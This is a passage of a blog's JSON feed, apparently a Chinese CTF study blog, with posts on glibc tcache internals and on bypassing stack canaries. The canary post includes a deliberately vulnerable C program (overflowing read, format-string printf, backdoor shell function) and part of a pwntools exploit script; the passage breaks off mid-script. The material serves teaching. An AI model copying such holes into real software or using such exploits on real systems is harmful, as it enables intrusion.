data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjNDEyMw==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> mchunkptr p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> have_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">size_t</span> tc_idx <span class=\"token operator\">=</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tcache</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins <span class=\"token comment\">// 64</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_count<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>Âà§Êñ≠  <code>tc_idx</code>  ÂêàÊ≥ïÔºå <code>tcache-&gt;counts[tc_idx]</code>  Âú® 7 ‰∏™‰ª•ÂÜÖÊó∂ÔºåÂ∞±ËøõÂÖ•  <code>tcache_put()</code> Ôºå‰º†ÈÄíÁöÑ‰∏§‰∏™ÂèÇÊï∞ÊòØË¶ÅÈáäÊîæÁöÑ chunk ÂíåËØ• chunk ÂØπÂ∫îÁöÑ size Âú® tcache ‰∏≠ÁöÑ‰∏ãÊ†á„ÄÇ</p>\n<p>tcache_put()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9wdXQ=\">¬∂</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMjkwNw==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Caller must ensure that we know tc_idx is valid and there's room</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   for more chunks.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> __always_inline <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>mchunkptr chunk<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> tc_idx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tcache_entry <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> TCACHE_MAX_BINS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  e<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">++</span><span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_puts()</code>  ÂÆåÊàê‰∫ÜÊääÈáäÊîæÁöÑ chunk ÊèíÂÖ•Âà∞  <code>tcache-&gt;entries[tc_idx]</code>  ÈìæË°®Â§¥ÈÉ®ÁöÑÊìç‰ΩúÔºå‰πüÂá†‰πéÊ≤°Êúâ‰ªª‰Ωï‰øùÊä§„ÄÇÂπ∂‰∏î <strong>Ê≤°ÊúâÊää p ‰ΩçÁΩÆÈõ∂</strong>„ÄÇ</p>\n<blockquote>\n<p>ÁâàÊùÉÂ£∞ÊòéÔºöÊú¨Êñá‰∏∫ CSDN Âçö‰∏ª„ÄåËë£Âì•ÁöÑÈªëÊùøÊä•„ÄçÁöÑÂéüÂàõÊñáÁ´†ÔºåÈÅµÂæ™ CC 4.0 BY-SA ÁâàÊùÉÂçèËÆÆÔºåËΩ¨ËΩΩËØ∑ÈôÑ‰∏äÂéüÊñáÂá∫Â§ÑÈìæÊé•ÂèäÊú¨Â£∞Êòé„ÄÇ<br>\nÂéüÊñáÈìæÊé•Ôºö<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1L2FydGljbGUvZGV0YWlscy85Njg2NTMyMQ==\">https://blog.csdn.net/qq_41453285/article/details/96865321</span></p>\n<p>ctf-wiki:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUv\">tcache - CTF Wiki (ctf-wiki.org)</span></p>\n</blockquote>\n",
            "tags": [
                "Â†Ü"
            ]
        },
        {
            "id": "http://example.com/2023/08/04/b-canary/",
            "url": "http://example.com/2023/08/04/b-canary/",
            "title": "b_canary",
            "date_published": "2023-08-04T04:02:09.000Z",
            "content_html": "<h1 id=\"canary‰ªãÁªç\"><a class=\"markdownIt-Anchor\" href=\"#canary‰ªãÁªç\">#</a> canary ‰ªãÁªçÔºö</h1>\n<ol>\n<li>Âú®ÂáΩÊï∞Ë∞ÉÁî®ÂèëÁîüÊó∂ÔºåÂêëÊ†àÂ∏ßÂÜÖÂéãÂÖ•‰∏Ä‰∏™È¢ùÂ§ñÁöÑÈöèÊú∫ DWORDÔºåËøô‰∏™ÈöèÊú∫Êï∞Ë¢´Áß∞‰∏∫ ‚ÄúCanary‚Äù</li>\n<li>Â¶ÇÊûú‰ΩøÁî® IDA ÂèçÊ±áÁºñÁöÑËØùÔºåÊÇ®ÂèØËÉΩ‰ºöÁúãÂà∞ IDA ‰ºöÂ∞ÜËøô‰∏™ÈöèÊú∫Êï∞Ê†áÊ≥®‰∏∫ ‚ÄúSecurity Cookie‚ÄùÔºåÂú®ÈÉ®ÂàÜ‰π¶Á±çÁöÑÂèôËø∞‰∏≠‰ºöÁî® Security Cookie Êù•ÂºïÁî®ËøôÁßçÈöèÊú∫Êï∞</li>\n<li>Canary ‰Ωç‰∫é EBP ‰πãÂâçÔºåÁ≥ªÁªüËøòÂ∞ÜÂú®ÂÜÖÂ≠òÂå∫Âüü‰∏≠Â≠òÊîæ‰∏Ä‰∏™ Canary ÁöÑÂâØÊú¨</li>\n<li>ÂΩìÊ†à‰∏≠ÂèëÁîüÊ∫¢Âá∫Êó∂ÔºåCanary Â∞ÜË¢´È¶ñÂÖàÊ∑πÊ≤°Ôºå‰πãÂêéÊâçÊòØ EBP ÂíåËøîÂõûÂú∞ÂùÄ</li>\n<li>Âú®ÂáΩÊï∞ËøîÂõû‰πãÂâçÔºåÁ≥ªÁªüÂ∞ÜÊâßË°å‰∏Ä‰∏™È¢ùÂ§ñÁöÑÂÆâÂÖ®È™åËØÅÊìç‰ΩúÔºåË¢´Áß∞‰Ωú ‚ÄúSecurity check‚Äù Âú® Security check ËøáÁ®ã‰∏≠ÔºåÁ≥ªÁªüÂ∞ÜÊØîËæÉÊ†àÂ∏ß‰∏≠ÂéüÂÖàÂ≠òÊîæÁöÑ Canary ÂíåÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂâØÊú¨ÔºåÂ¶ÇÊûú‰∏§ËÄÖ‰∏çÁ¨¶ÂêàÔºåËØ¥ÊòéÊ†àÂ∏ß‰∏≠ÁöÑ Canary Â∑≤Ë¢´Á†¥ÂùèÔºåÂç≥Ê†à‰∏≠ÂèëÁîü‰∫ÜÊ∫¢Âá∫</li>\n<li>ÂΩìÊ£ÄÊµãÂà∞Ê†à‰∏≠ÂèëÁîü‰∫ÜÊ∫¢Âá∫Êó∂ÔºåÁ≥ªÁªüÂ∞ÜËøõÂÖ•ÂºÇÂ∏∏Â§ÑÁêÜÊµÅÁ®ãÔºåÂáΩÊï∞‰∏ç‰ºöË¢´Ê≠£Â∏∏ËøîÂõûÔºåret Êåá‰ª§‰πü‰∏ç‰ºöË¢´ÊâßË°å</li>\n</ol>\n<h3 id=\"ÊñπÊ≥ï‰∏Ä-Ë¶ÜÁõñÊà™Êñ≠Â≠óÁ¨¶Ëé∑Âèñcanary\"><a class=\"markdownIt-Anchor\" href=\"#ÊñπÊ≥ï‰∏Ä-Ë¶ÜÁõñÊà™Êñ≠Â≠óÁ¨¶Ëé∑Âèñcanary\">#</a> ÊñπÊ≥ï‰∏Ä Ë¶ÜÁõñÊà™Êñ≠Â≠óÁ¨¶Ëé∑Âèñ Canary</h3>\n<h5 id=\"ÂéüÁêÜ\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ\">#</a> ÂéüÁêÜ</h5>\n<p>Canary ËÆæËÆ°ÂÖ∂‰ΩéÂ≠óËäÇ‰∏∫ \\x00ÔºåÊú¨ÊÑèÊòØÈòªÊ≠¢Ë¢´ read„ÄÅwrite Á≠âÂáΩÊï∞Áõ¥Êé•Â∞Ü Canary ËØªÂá∫Êù•„ÄÇÈÄöËøáÊ†àÊ∫¢Âá∫Â∞Ü‰Ωé‰ΩçÁöÑ \\x00 Ë¶ÜÂÜôÔºåÂ∞±ÂèØ‰ª•ËØªÂá∫ Canary ÁöÑÂÄº„ÄÇ</p>\n<p>‰ªé‰∏äÈù¢ÁöÑÂàÜÊûêÔºåÊàë‰ª¨ÂèØ‰ª•Ê¢≥ÁêÜÂá∫ÁªïËøáÁöÑÊÄùË∑ØÔºö</p>\n<p>ÊûÑÈÄ†Á¨¨‰∏ÄÊ¨°Ê∫¢Âá∫ÔºåË¶ÜÂÜô Canary ‰ΩéÂ≠óËäÇ \\x00ÔºåËØªÂèñÂá∫ Canary ÂÄº<br>\nÊûÑÈÄ†Á¨¨‰∫åÊ¨°Ê∫¢Âá∫ÔºåÂà©Áî®Ëé∑ÂèñÁöÑ Canary ÈáçÊñ∞ÊûÑÈÄ† payloadÔºåËé∑Âèñ shell„ÄÇ</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// x00cannary.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ÁºñËØëÁîüÊàê 32 ‰∏∫ÁöÑ ELF Êñá‰ª∂</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gcc x00cannary.c -no-pie <span class=\"token parameter variable\">-m32</span> -fstack-protector <span class=\"token parameter variable\">-z</span> noexecstack <span class=\"token parameter variable\">-o</span> x00canary</pre></td></tr></table></figure><h6 id=\"Êü•Áúã‰øùÊä§\"><a class=\"markdownIt-Anchor\" href=\"#Êü•Áúã‰øùÊä§\">#</a> Êü•Áúã‰øùÊä§</h6>\n<p><img data-src=\"/img/canary/image-20230804091104686.png\" alt=\"image-20230804091104686\"></p>\n<h6 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804091402007.png\" alt=\"image-20230804091402007\"></p>\n<p><img data-src=\"/img/canary/image-20230804091406354.png\" alt=\"image-20230804091406354\"></p>\n<p>‰ºöÂèëÁé∞ÊúâÂêéÈó®ÂáΩÊï∞ÔºåÂπ∂‰∏î v3 ÊòØÊàë‰ª¨ÁöÑ canary„ÄÇÂú® read ÂáΩÊï∞‰∏≠ÊúâÂæàÊòéÊòæÁöÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û„ÄÇ</p>\n<p>ËøôÈ¢òÂºÄÂêØ‰∫ÜÁöÑ CanaryÔºåÊâÄ‰ª•Áõ¥Êé•ËøõË°åÊ†àÊ∫¢Âá∫ËÇØÂÆöÊòØ‰∏çË°åÁöÑ„ÄÇ</p>\n<ul>\n<li>ÊûÑÈÄ†Á¨¨‰∏ÄÊ¨°Ê∫¢Âá∫ÔºåË¶ÜÂÜô Canary ‰ΩéÂ≠óËäÇ \\x00ÔºåËØªÂèñÂá∫ Canary ÂÄºÔºå‰ªéÊ†àÈ°∂Âà∞ Canary ‰ΩéÂ≠óËäÇÁöÑË∑ùÁ¶ªÂ∫îËØ•ÊòØ 0x70 - 0xc„ÄÇ</li>\n</ul>\n<ul>\n<li>ÊûÑÈÄ†Á¨¨‰∫åÊ¨°Ê∫¢Âá∫ÔºåÂà©Áî®Ê≥ÑÈú≤ÁöÑ canary ËøõË°åÊ†àÊ∫¢Âá∫.</li>\n</ul>\n<p>Ê†àÈ°∂Âà∞ ebp ÁöÑË∑ùÁ¶ªÊòØ 0x70ÔºåCanary Âà∞ ebp ÁöÑË∑ùÁ¶ªÊòØ 0xcÔºåÂõ†Ê≠§Ë¶ÜÁõñ Canary ‰πãÂêéÔºåËøòË¶ÅÈ¢ùÂ§ñÂ¢ûÂä† 0x8 ÁöÑÂ≠óËäÇÔºåÂÜçÂä†‰∏ä ebp Êú¨Ë∫´ÈïøÂ∫¶ 0x4ÔºåÊâÄ‰ª•Ë¶ÅÈ¢ùÂ§ñÂ¢ûÂä† 0xC ÁöÑÂ≠óËäÇÂÜÖÂÆπ„ÄÇ</p>\n<h6 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./x00canary'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./x00canary'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>getshell <span class=\"token operator\">=</span> <span class=\"token number\">0x80485A6</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Hello Hacker!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>recvbytes <span class=\"token operator\">=</span> rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>recvbytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token 